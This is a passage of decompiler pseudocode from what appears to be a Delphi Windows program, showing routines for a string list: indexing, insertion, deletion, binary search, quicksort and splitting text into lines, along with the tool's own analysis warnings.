  int *v8; // [esp-4h] [ebp-20h]
  void *v9; // [esp+0h] [ebp-1Ch]
  char *v10; // [esp+8h] [ebp-14h] BYREF
  int v11; // [esp+Ch] [ebp-10h]
  char *v12; // [esp+10h] [ebp-Ch] BYREF
  int v13; // [esp+14h] [ebp-8h]
  int v14; // [esp+18h] [ebp-4h]
  int savedregs; // [esp+1Ch] [ebp+0h] BYREF

  v10 = 0;
  v12 = 0;
  v14 = a2;
  v8 = &savedregs;
  v7 = &loc_419EC8;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v3 = (*(int (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)a1 + 20))(ExceptionList) - 1;
  if ( v3 < 0 )
  {
LABEL_6:
    v13 = -1;
  }
  else
  {
    v11 = v3 + 1;
    v13 = 0;
    while ( 1 )
    {
      (*(void (__fastcall **)(char **, int))(*(_DWORD *)a1 + 12))(&v12, v13);
      v4 = sub_409E7C((char *)sub_419EE0, v12);
      if ( v4 )
      {
        Delphi_Copy_40477C((int)v12, 1, v4 - 1, &v10);
        if ( !(*(int (__fastcall **)(int, char *))(*(_DWORD *)a1 + 52))(v14, v10) )
          break;
      }
      ++v13;
      if ( !--v11 )
        goto LABEL_6;
    }
  }
  __writefsdword(0, (unsigned int)v7);
  v9 = &loc_419ECF;
  sub_40426C(&v10);
  sub_40426C(&v12);
  return v13;
}

//----- (00419EE0) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __usercall sub_419EE0@<eax>(int a1@<eax>, int a2@<edx>)
{
  int v4; // eax
  int v5; // ebx
  int v6; // esi

  v4 = (*(int (**)(void))(*(_DWORD *)a1 + 20))();
  if ( v4 - 1 < 0 )
    return -1;
  v5 = v4;
  v6 = 0;
  while ( a2 != (*(int (**)(void))(*(_DWORD *)a1 + 24))() )
  {
    ++v6;
    if ( !--v5 )
      return -1;
  }
  return v6;
}
// 419F17: positive sp value 4 has been found
// 419EE0: could not find valid save-restore pair for ebx

//----- (00419F18) --------------------------------------------------------
int __userpurge sub_419F18@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4)
{
  (*(void (__fastcall **)(int, int))(*(_DWORD *)a1 + 96))(a3, a2);
  return (*(int (__fastcall **)(int, int))(*(_DWORD *)a1 + 36))(a4, a2);
}

//----- (00419F48) --------------------------------------------------------
_DWORD *__usercall sub_419F48@<eax>(int a1@<eax>, char *a2@<edx>)
{
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-14h] BYREF
  void *v5; // [esp-8h] [ebp-10h]
  int *v6; // [esp-4h] [ebp-Ch]
  void *v7; // [esp+0h] [ebp-8h]
  _DWORD *v8; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v8 = sub_41AF50((int)&off_417CC0, 1, a2, 32);
  v6 = &savedregs;
  v5 = &loc_419F90;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  (*(void (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)a1 + 108))(ExceptionList);
  __writefsdword(0, (unsigned int)v5);
  v7 = &loc_419F97;
  return sub_403534(v8);
}
// 417CC0: using guessed type int (*off_417CC0)();

//----- (00419F9C) --------------------------------------------------------
_DWORD *__usercall sub_419F9C@<eax>(_DWORD *a1@<eax>, int a2@<edx>)
{
  int v3; // esi
  int v4; // esi
  struct _EXCEPTION_REGISTRATION_RECORD *v6; // [esp-18h] [ebp-28h] BYREF
  void *v7; // [esp-14h] [ebp-24h]
  int *v8; // [esp-10h] [ebp-20h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-1Ch] BYREF
  void *v10; // [esp-8h] [ebp-18h]
  int *v11; // [esp-4h] [ebp-14h]
  void *v12; // [esp+0h] [ebp-10h]
  char *v13; // [esp+8h] [ebp-8h] BYREF
  _DWORD *v14; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v13 = 0;
  v14 = a1;
  v11 = &savedregs;
  v10 = &loc_41A03A;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_419914(a1);
  v8 = &savedregs;
  v7 = &loc_41A01D;
  v6 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v6);
  v3 = sub_41AAD4(a2);
  v4 = v3 - sub_41AAA0(a2);
  sub_40435C(&v13, 0, v4);
  (*(void (__fastcall **)(int, char *, struct _EXCEPTION_REGISTRATION_RECORD *, void *, int *, struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)a2 + 8))(
    v4,
    v13,
    v6,
    v7,
    v8,
    ExceptionList);
  (*(void (**)(void))(*v14 + 44))();
  __writefsdword(0, (unsigned int)v10);
  v12 = &loc_41A024;
  sub_4199D0(v14);
  __writefsdword(0, (unsigned int)v10);
  v12 = &loc_41A041;
  return sub_40426C(&v13);
}

//----- (0041A048) --------------------------------------------------------
_DWORD *__usercall sub_41A048@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  struct _EXCEPTION_REGISTRATION_RECORD *v5; // edi
  _DWORD v7[3]; // [esp-18h] [ebp-2Ch] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-20h] BYREF
  void *v9; // [esp-8h] [ebp-1Ch]
  int *v10; // [esp-4h] [ebp-18h]
  void *v11; // [esp+0h] [ebp-14h]
  int v12; // [esp+Ch] [ebp-8h] BYREF
  _DWORD *v13; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v12 = 0;
  v13 = a1;
  v10 = &savedregs;
  v9 = &loc_41A0E9;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  if ( a3 != a2 )
  {
    sub_419914(v13);
    v7[2] = &savedregs;
    v7[1] = &loc_41A0CC;
    v7[0] = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v7);
    (*(void (__fastcall **)(int *, int, _DWORD, void *, int *, struct _EXCEPTION_REGISTRATION_RECORD *))(*v13 + 12))(
      &v12,
      a2,
      v7[0],
      &loc_41A0CC,
      &savedregs,
      ExceptionList);
    v5 = (struct _EXCEPTION_REGISTRATION_RECORD *)(*(int (**)(void))(*v13 + 24))();
    (*(void (**)(void))(*v13 + 72))();
    ExceptionList = v5;
    (*(void (__fastcall **)(int, int, struct _EXCEPTION_REGISTRATION_RECORD *))(*v13 + 100))(v12, a3, v5);
    __writefsdword(0, (unsigned int)v9);
    v11 = &loc_41A0D3;
    sub_4199D0(v13);
  }
  __writefsdword(0, (unsigned int)ExceptionList);
  v10 = (int *)&loc_41A0F0;
  return sub_40426C(&v12);
}

//----- (0041A0F8) --------------------------------------------------------
int __usercall sub_41A0F8@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  int v6; // edi

  v6 = (*(int (**)(void))(*(_DWORD *)a1 + 24))();
  (*(void (**)(void))(*(_DWORD *)a1 + 72))();
  return (*(int (__fastcall **)(int, int, int))(*(_DWORD *)a1 + 100))(a3, a2, v6);
}

//----- (0041A12C) --------------------------------------------------------
_DWORD *__usercall sub_41A12C@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edx>)
{
  int v2; // ecx
  void *v3; // ecx
  _DWORD v5[3]; // [esp-18h] [ebp-24h] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-18h] BYREF
  void *v7; // [esp-8h] [ebp-14h]
  int *v8; // [esp-4h] [ebp-10h]
  char *v9; // [esp+0h] [ebp-Ch] BYREF
  _DWORD *v10; // [esp+4h] [ebp-8h]
  _DWORD *v11; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v9 = 0;
  v10 = a2;
  v11 = a1;
  v8 = &savedregs;
  v7 = &loc_41A1D0;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_41C6AC(a2, 0);
  sub_419914(v11);
  v5[2] = &savedregs;
  v5[1] = &loc_41A1AB;
  v5[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  (*(void (__stdcall **)(_DWORD, void *, int *, struct _EXCEPTION_REGISTRATION_RECORD *))(*v11 + 68))(
    v5[0],
    &loc_41A1AB,
    &savedregs,
    ExceptionList);
  while ( !sub_41B910(v10, v2) )
  {
    sub_41CF5C(v10, &v9);
    (*(void (**)(void))(*v11 + 56))();
  }
  __writefsdword(0, (unsigned int)v7);
  v9 = (char *)&loc_41A1B2;
  sub_4199D0(v11);
  sub_41C6B4(v3);
  __writefsdword(0, (unsigned int)v7);
  v9 = (char *)&loc_41A1D7;
  return sub_40426C(&v9);
}
// 41A18C: variable 'v2' is possibly undefined
// 41A1B5: variable 'v3' is possibly undefined

//----- (0041A1DC) --------------------------------------------------------
_DWORD *__usercall sub_41A1DC@<eax>(int a1@<eax>, char *a2@<edx>)
{
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-14h] BYREF
  void *v5; // [esp-8h] [ebp-10h]
  int *v6; // [esp-4h] [ebp-Ch]
  void *v7; // [esp+0h] [ebp-8h]
  _DWORD *v8; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v8 = sub_41AF50((int)&off_417CC0, 1, a2, 0xFFFF);
  v6 = &savedregs;
  v5 = &loc_41A227;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  (*(void (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)a1 + 120))(ExceptionList);
  __writefsdword(0, (unsigned int)v5);
  v7 = &loc_41A22E;
  return sub_403534(v8);
}
// 417CC0: using guessed type int (*off_417CC0)();

//----- (0041A234) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
_DWORD *__usercall sub_41A234@<eax>(int a1@<eax>, int a2@<esi>)
{
  int v2; // eax
  _DWORD v4[5]; // [esp-14h] [ebp-18h] BYREF
  int v5; // [esp+0h] [ebp-4h] BYREF
  void *savedregs; // [esp+4h] [ebp+0h] BYREF

  v5 = 0;
  v4[3] = a2;
  v4[2] = &savedregs;
  v4[1] = &loc_41A281;
  v4[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  (*(void (__stdcall **)(_DWORD, void *, void **, int))(*(_DWORD *)a1 + 28))(v4[0], &loc_41A281, &savedregs, a2);
  v2 = sub_404524(v5);
  sub_41AD04(v2, v5);
  __writefsdword(0, v4[4]);
  savedregs = &loc_41A288;
  return sub_40426C(&v5);
}
// 41A234: could not find valid save-restore pair for esi
// 41A27B: bad sp value at call
// 41AD04: using guessed type int __fastcall sub_41AD04(_DWORD, _DWORD);

//----- (0041A294) --------------------------------------------------------
_DWORD *__usercall sub_41A294@<eax>(int a1@<eax>, int a2@<edx>)
{
  _DWORD *result; // eax

  if ( *(_DWORD *)(a1 + 12) )
    (*(void (**)(void))(**(_DWORD **)(a1 + 12) + 16))();
  result = sub_405F58((_DWORD *)(a1 + 12), a2);
  if ( *(_DWORD *)(a1 + 12) )
    return (_DWORD *)(*(int (**)(void))(**(_DWORD **)(a1 + 12) + 12))();
  return result;
}

//----- (0041A2C8) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
_DWORD *__usercall sub_41A2C8@<eax>(int a1@<eax>, char *a2@<edx>)
{
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-14h] [ebp-18h] BYREF
  void *v5; // [esp-10h] [ebp-14h]
  void **v6; // [esp-Ch] [ebp-10h]
  int v7; // [esp-8h] [ebp-Ch]
  unsigned int v8; // [esp-4h] [ebp-8h]
  char *v9; // [esp+0h] [ebp-4h] BYREF
  void *savedregs; // [esp+4h] [ebp+0h] BYREF

  v9 = 0;
  v6 = &savedregs;
  v5 = &loc_41A30B;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_40445C(&v9, a2);
  (*(void (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *, void *, void **, int))(*(_DWORD *)a1 + 44))(
    ExceptionList,
    v5,
    v6,
    v7);
  __writefsdword(0, v8);
  savedregs = &loc_41A312;
  return sub_40426C(&v9);
}
// 41A305: bad sp value at call

//----- (0041A318) --------------------------------------------------------
_DWORD *__usercall sub_41A318@<eax>(_DWORD *a1@<eax>, char *a2@<edx>)
{
  char *v3; // eax
  _DWORD v5[3]; // [esp-18h] [ebp-24h] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-18h] BYREF
  void *v7; // [esp-8h] [ebp-14h]
  int *v8; // [esp-4h] [ebp-10h]
  void *v9; // [esp+0h] [ebp-Ch]
  char *v10; // [esp+4h] [ebp-8h] BYREF
  _DWORD *v11; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v10 = 0;
  v11 = a1;
  v8 = &savedregs;
  v7 = &loc_41A3CC;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_419914(a1);
  v5[2] = &savedregs;
  v5[1] = &loc_41A3AF;
  v5[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  (*(void (__stdcall **)(_DWORD, void *, int *, struct _EXCEPTION_REGISTRATION_RECORD *))(*v11 + 68))(
    v5[0],
    &loc_41A3AF,
    &savedregs,
    ExceptionList);
  if ( a2 )
  {
    while ( *a2 )
    {
      v3 = a2;
      while ( *a2 && *a2 != 10 && *a2 != 13 )
        ++a2;
      sub_40435C(&v10, v3, a2 - v3);
      (*(void (**)(void))(*v11 + 56))();
      if ( *a2 == 13 )
        ++a2;
      if ( *a2 == 10 )
        ++a2;
    }
  }
  __writefsdword(0, (unsigned int)v7);
  v9 = &loc_41A3B6;
  sub_4199D0(v11);
  __writefsdword(0, (unsigned int)v7);
  v9 = &loc_41A3D3;
  return sub_40426C(&v10);
}

//----- (0041A3DC) --------------------------------------------------------
_DWORD *__usercall sub_41A3DC@<eax>(int a1@<eax>, _DWORD *a2@<edx>)
{
  int v2; // eax
  int v3; // ecx
  int v4; // ebx
  int v5; // esi
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-24h] BYREF
  void *v8; // [esp-8h] [ebp-20h]
  int *v9; // [esp-4h] [ebp-1Ch]
  void *v10; // [esp+0h] [ebp-18h]
  CHAR *v11; // [esp+Ch] [ebp-Ch] BYREF
  _DWORD *v12; // [esp+10h] [ebp-8h]
  int v13; // [esp+14h] [ebp-4h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v11 = 0;
  v12 = a2;
  v13 = a1;
  v9 = &savedregs;
  v8 = &loc_41A452;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_41E44C(a2, 0);
  v2 = (*(int (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)v13 + 20))(ExceptionList);
  if ( v2 - 1 >= 0 )
  {
    v4 = v2;
    v5 = 0;
    do
    {
      (*(void (__fastcall **)(CHAR **, int))(*(_DWORD *)v13 + 12))(&v11, v5);
      sub_41F99C(v12, v11);
      ++v5;
      --v4;
    }
    while ( v4 );
  }
  sub_41E454(v12, v3);
  __writefsdword(0, (unsigned int)v8);
  v10 = &loc_41A459;
  return sub_40426C(&v11);
}
// 41A437: variable 'v3' is possibly undefined

//----- (0041A460) --------------------------------------------------------
int __fastcall sub_41A460(char *a1, char *a2)
{
  return sub_407B28(a2, a1);
}

//----- (0041A46C) --------------------------------------------------------
int __usercall sub_41A46C@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *v2; // eax
  char v3; // dl
  char v4; // bl
  _DWORD *v5; // esi
  int result; // eax

  v2 = sub_4038CC(a1, a2);
  v4 = v3;
  v5 = v2;
  v2[8] = 0;
  v2[9] = 0;
  v2[10] = 0;
  v2[11] = 0;
  sub_419754(v2, v3 & 0xFC);
  if ( v5[5] )
    sub_404CE4((int *)v5[4], (char *)dword_417A54, v5[5]);
  v5[5] = 0;
  result = (*(int (**)(void))(*v5 + 40))();
  if ( v4 > 0 )
    return sub_4038B4(v5);
  return result;
}
// 41A473: variable 'v3' is possibly undefined
// 417A54: using guessed type int dword_417A54[5];

//----- (0041A4C8) --------------------------------------------------------
int __usercall sub_41A4C8@<eax>(int a1@<eax>)
{
  return (*(int (__thiscall **)(_DWORD))(*(_DWORD *)a1 + 60))(0);
}

//----- (0041A4D4) --------------------------------------------------------
int __usercall sub_41A4D4@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  char v6; // al
  bool v7; // cf
  char v8; // al
  int v10[5]; // [esp+4h] [ebp-14h] BYREF

  v10[0] = a3;
  if ( !*(_BYTE *)(a1 + 28) )
  {
    v10[0] = *(_DWORD *)(a1 + 20);
LABEL_7:
    (*(void (__fastcall **)(int, int, int))(*(_DWORD *)a1 + 136))(a2, v10[0], a3);
    return v10[0];
  }
  if ( !(*(unsigned __int8 (__fastcall **)(int *, int))(*(_DWORD *)a1 + 140))(v10, a2) )
    goto LABEL_7;
  v6 = *(_BYTE *)(a1 + 29);
  v7 = v6 == 0;
  v8 = v6 - 1;
  if ( !v7 )
  {
    if ( v8 == 1 )
      sub_419AC8(a1, off_42B8A4, 0);
    goto LABEL_7;
  }
  return v10[0];
}
// 42B8A4: using guessed type int **off_42B8A4;
// 41A4D4: using guessed type int var_14[5];

//----- (0041A538) --------------------------------------------------------
int __usercall sub_41A538@<eax>(int result@<eax>, int a2@<ecx>)
{
  if ( !*(_DWORD *)(result + 8) )
  {
    if ( *(_WORD *)(result + 34) )
      return (*(int (__fastcall **)(int, int))(result + 32))(a2, result);
  }
  return result;
}

//----- (0041A554) --------------------------------------------------------
int __usercall sub_41A554@<eax>(int result@<eax>, int a2@<ecx>)
{
  if ( !*(_DWORD *)(result + 8) )
  {
    if ( *(_WORD *)(result + 42) )
      return (*(int (__fastcall **)(int, int))(result + 40))(a2, result);
  }
  return result;
}

//----- (0041A570) --------------------------------------------------------
_DWORD *__usercall sub_41A570@<eax>(_DWORD *result@<eax>)
{
  _DWORD *v1; // ebx

  v1 = result;
  if ( result[5] )
  {
    (*(void (**)(void))(*result + 132))();
    sub_404CE4((int *)v1[4], (char *)dword_417A54, v1[5]);
    v1[5] = 0;
    (*(void (**)(void))(*v1 + 40))();
    return (_DWORD *)(*(int (**)(void))(*v1 + 128))();
  }
  return result;
}
// 417A54: using guessed type int dword_417A54[5];

//----- (0041A5B0) --------------------------------------------------------
int __usercall sub_41A5B0@<eax>(_DWORD *a1@<eax>, int a2@<edx>)
{
  int v4; // eax

  if ( a2 < 0 || a2 >= a1[5] )
    sub_419AC8((int)a1, off_42B9FC[0], a2);
  (*(void (**)(void))(*a1 + 132))();
  sub_404DD0((int *)(a1[4] + 8 * a2), (char *)dword_417A54);
  v4 = --a1[5];
  if ( a2 < v4 )
    sub_402844((char *)(a1[4] + 8 * a2 + 8), (char *)(a1[4] + 8 * a2), 8 * (v4 - a2));
  return (*(int (**)(void))(*a1 + 128))();
}
// 417A54: using guessed type int dword_417A54[5];
// 42B9FC: using guessed type int **off_42B9FC[3];

//----- (0041A61C) --------------------------------------------------------
int __usercall sub_41A61C@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  if ( a2 < 0 || a2 >= a1[5] )
    sub_419AC8((int)a1, off_42B9FC[0], a2);
  if ( a3 < 0 || a3 >= a1[5] )
    sub_419AC8((int)a1, off_42B9FC[0], a3);
  (*(void (**)(void))(*a1 + 132))();
  sub_41A678((int)a1, a2, a3);
  return (*(int (**)(void))(*a1 + 128))();
}
// 42B9FC: using guessed type int **off_42B9FC[3];

//----- (0041A678) --------------------------------------------------------
int *__usercall sub_41A678@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  int *v3; // edx
  int *result; // eax
  int v5; // ecx
  int v6; // ecx

  v3 = (int *)(*(_DWORD *)(a1 + 16) + 8 * a2);
  result = (int *)(*(_DWORD *)(a1 + 16) + 8 * a3);
  v5 = *v3;
  *v3 = *result;
  *result = v5;
  v6 = v3[1];
  v3[1] = result[1];
  result[1] = v6;
  return result;
}

//----- (0041A69C) --------------------------------------------------------
char __usercall sub_41A69C@<al>(int a1@<eax>, int a2@<edx>, signed int *a3@<ecx>)
{
  signed int v4; // esi
  unsigned int v5; // ebx
  int v6; // eax
  char v10; // [esp+8h] [ebp-18h]
  int v11; // [esp+Ch] [ebp-14h]

  v10 = 0;
  v4 = 0;
  v11 = *(_DWORD *)(a1 + 20) - 1;
  if ( v11 >= 0 )
  {
    do
    {
      v5 = (unsigned int)(v4 + v11) >> 1;
      v6 = (*(int (__fastcall **)(int, _DWORD))(*(_DWORD *)a1 + 52))(a2, *(_DWORD *)(*(_DWORD *)(a1 + 16) + 8 * v5));
      if ( v6 >= 0 )
      {
        v11 = v5 - 1;
        if ( !v6 )
        {
          v10 = 1;
          if ( *(_BYTE *)(a1 + 29) != 1 )
            v4 = v5;
        }
      }
      else
      {
        v4 = v5 + 1;
      }
    }
    while ( v4 <= v11 );
  }
  *a3 = v4;
  return v10;
}

//----- (0041A714) --------------------------------------------------------
volatile __int32 *__usercall sub_41A714@<eax>(int a1@<eax>, int a2@<edx>, volatile __int32 *a3@<ecx>)
{
  if ( a2 < 0 || a2 >= *(_DWORD *)(a1 + 20) )
    sub_419AC8(a1, off_42B9FC[0], a2);
  return sub_4042C0(a3, *(_DWORD *)(*(_DWORD *)(a1 + 16) + 8 * a2));
}
// 42B9FC: using guessed type int **off_42B9FC[3];

//----- (0041A748) --------------------------------------------------------
int __usercall sub_41A748@<eax>(int a1@<eax>)
{
  return *(_DWORD *)(a1 + 24);
}

//----- (0041A74C) --------------------------------------------------------
int __usercall sub_41A74C@<eax>(int a1@<eax>)
{
  return *(_DWORD *)(a1 + 20);
}

//----- (0041A750) --------------------------------------------------------
int __usercall sub_41A750@<eax>(int a1@<eax>, int a2@<edx>)
{
  if ( a2 < 0 || a2 >= *(_DWORD *)(a1 + 20) )
    sub_419AC8(a1, off_42B9FC[0], a2);
  return *(_DWORD *)(*(_DWORD *)(a1 + 16) + 8 * a2 + 4);
}
// 42B9FC: using guessed type int **off_42B9FC[3];

//----- (0041A778) --------------------------------------------------------
int __usercall sub_41A778@<eax>(int a1@<eax>)
{
  return (*(int (**)(void))(*(_DWORD *)a1 + 40))();
}
// 41A785: conditional instruction was optimized away because edx.4>=41

//----- (0041A7AC) --------------------------------------------------------
int __usercall sub_41A7AC@<eax>(_BYTE *a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  int v4[3]; // [esp+0h] [ebp-Ch] BYREF

  v4[0] = a3;
  if ( !a1[28] )
    return sub_419D90((int)a1, a2);
  if ( !(*(unsigned __int8 (__fastcall **)(int *, int))(*(_DWORD *)a1 + 140))(v4, a2) )
    v4[0] = -1;
  return v4[0];
}
// 41A7AC: using guessed type int var_C[3];

//----- (0041A7E8) --------------------------------------------------------
int __usercall sub_41A7E8@<eax>(int a1@<eax>)
{
  return (*(int (__stdcall **)(_DWORD))(*(_DWORD *)a1 + 100))(0);
}

//----- (0041A7F8) --------------------------------------------------------
int __userpurge sub_41A7F8@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4)
{
  if ( *(_BYTE *)(a1 + 28) )
    sub_419AC8(a1, off_42B930[0], 0);
  if ( a2 < 0 || a2 > *(_DWORD *)(a1 + 20) )
    sub_419AC8(a1, off_42B9FC[0], a2);
  return (*(int (__fastcall **)(int, int, int))(*(_DWORD *)a1 + 136))(a3, a2, a4);
}
// 42B930: using guessed type int **off_42B930[3];
// 42B9FC: using guessed type int **off_42B9FC[3];

//----- (0041A84C) --------------------------------------------------------
int __userpurge sub_41A84C@<eax>(_DWORD *a1@<eax>, int a2@<edx>, __int32 a3@<ecx>, int a4)
{
  int v7; // eax
  int v8; // esi

  (*(void (**)(void))(*a1 + 132))();
  if ( a1[5] == a1[6] )
    sub_41A778((int)a1);
  v7 = a1[5];
  if ( a2 < v7 )
    sub_402844((char *)(a1[4] + 8 * a2), (char *)(a1[4] + 8 * a2 + 8), 8 * (v7 - a2));
  v8 = a1[4] + 8 * a2;
  *(_DWORD *)v8 = 0;
  *(_DWORD *)(v8 + 4) = a4;
  sub_4042C0((volatile __int32 *)v8, a3);
  ++a1[5];
  return (*(int (**)(void))(*a1 + 128))();
}

//----- (0041A8C4) --------------------------------------------------------
int __usercall sub_41A8C4@<eax>(int a1@<eax>, int a2@<edx>, __int32 a3@<ecx>)
{
  if ( *(_BYTE *)(a1 + 28) )
    sub_419AC8(a1, off_42B930[0], 0);
  if ( a2 < 0 || a2 >= *(_DWORD *)(a1 + 20) )
    sub_419AC8(a1, off_42B9FC[0], a2);
  (*(void (**)(void))(*(_DWORD *)a1 + 132))();
  sub_4042C0((volatile __int32 *)(*(_DWORD *)(a1 + 16) + 8 * a2), a3);
  return (*(int (**)(void))(*(_DWORD *)a1 + 128))();
}
// 42B930: using guessed type int **off_42B930[3];
// 42B9FC: using guessed type int **off_42B9FC[3];

//----- (0041A920) --------------------------------------------------------
int __usercall sub_41A920@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  if ( a2 < 0 || a2 >= a1[5] )
    sub_419AC8((int)a1, off_42B9FC[0], a2);
  (*(void (**)(void))(*a1 + 132))();
  *(_DWORD *)(a1[4] + 8 * a2 + 4) = a3;
  return (*(int (**)(void))(*a1 + 128))();
}
// 42B9FC: using guessed type int **off_42B9FC[3];

//----- (0041A960) --------------------------------------------------------
int *__userpurge sub_41A960@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int (__fastcall *a4)(unsigned int, int))
{
  int v4; // ebx
  int v5; // esi
  int i; // eax
  int *result; // eax
  unsigned int v8; // [esp+8h] [ebp-10h]

  do
  {
    v4 = a2;
    v5 = a3;
    v8 = (unsigned int)(a3 + a2) >> 1;
    for ( i = a4(v8, a2); ; i = a4(v8, v4) )
    {
      if ( i < 0 )
      {
        ++v4;
        continue;
      }
      while ( 1 )
      {
        result = (int *)a4(v8, v5);
        if ( (int)result <= 0 )
          break;
        --v5;
      }
      if ( v5 >= v4 )
      {
        result = sub_41A678(a1, v4, v5);
        if ( v4 == v8 )
        {
          v8 = v5;
        }
        else if ( v5 == v8 )
        {
          v8 = v4;
        }
        ++v4;
        --v5;
      }
      if ( v5 < v4 )
        break;
    }
    if ( v5 > a2 )
      result = (int *)sub_41A960(a4);
    a2 = v4;
  }
  while ( v4 < a3 );
  return result;
}

//----- (0041A9F4) --------------------------------------------------------
_DWORD *__usercall sub_41A9F4@<eax>(int a1@<eax>, int a2@<edx>)
{
  _DWORD *result; // eax

  result = sub_402720((_DWORD *)(a1 + 16), 8 * a2);
  *(_DWORD *)(a1 + 24) = a2;
  return result;
}

//----- (0041AA10) --------------------------------------------------------
int __usercall sub_41AA10@<eax>(int a1@<eax>, char a2@<dl>)
{
  if ( a2 )
    return (*(int (**)(void))(*(_DWORD *)a1 + 132))();
  else
    return (*(int (**)(void))(*(_DWORD *)a1 + 128))();
}

//----- (0041AA28) --------------------------------------------------------
int __usercall sub_41AA28@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  return (*(int (__fastcall **)(_DWORD, _DWORD))(*a1 + 52))(*(_DWORD *)(a1[4] + 8 * a3), *(_DWORD *)(a1[4] + 8 * a2));
}

//----- (0041AA3C) --------------------------------------------------------
int __usercall sub_41AA3C@<eax>(int a1@<eax>)
{
  return (*(int (**)(void))(*(_DWORD *)a1 + 148))();
}

//----- (0041AA4C) --------------------------------------------------------
int __usercall sub_41AA4C@<eax>(int result@<eax>, int (__fastcall *a2)(unsigned int, int)@<edx>)
{
  _DWORD *v3; // ebx

  v3 = (_DWORD *)result;
  if ( !*(_BYTE *)(result + 28) && *(int *)(result + 20) > 1 )
  {
    (*(void (**)(void))(*(_DWORD *)result + 132))();
    sub_41A960((int)v3, 0, v3[5] - 1, a2);
    return (*(int (**)(void))(*v3 + 128))();
  }
  return result;
}

//----- (0041AA84) --------------------------------------------------------
int __usercall sub_41AA84@<eax>(int a1@<eax>, char *a2@<edx>, char *a3@<ecx>)
{
  if ( *(_BYTE *)(a1 + 30) )
    return sub_407AF0(a2, a3);
  else
    return sub_407B28(a2, a3);
}

//----- (0041AAA0) --------------------------------------------------------
__int64 __usercall sub_41AAA0@<edx:eax>(int a1@<eax>)
{
  return ((__int64 (__stdcall *)(_DWORD, _DWORD))*(_DWORD *)(*(_DWORD *)a1 + 20))(0, 0);
}

//----- (0041AAC0) --------------------------------------------------------
int __userpurge sub_41AAC0@<eax>(int a1@<eax>, int a2, int a3)
{
  return (*(int (__stdcall **)(int, int))(*(_DWORD *)a1 + 20))(a2, a3);
}

//----- (0041AAD4) --------------------------------------------------------
__int64 __usercall sub_41AAD4@<edx:eax>(int a1@<eax>)
{
  __int64 v3; // [esp+18h] [ebp-14h]
  __int64 v4; // [esp+20h] [ebp-Ch]

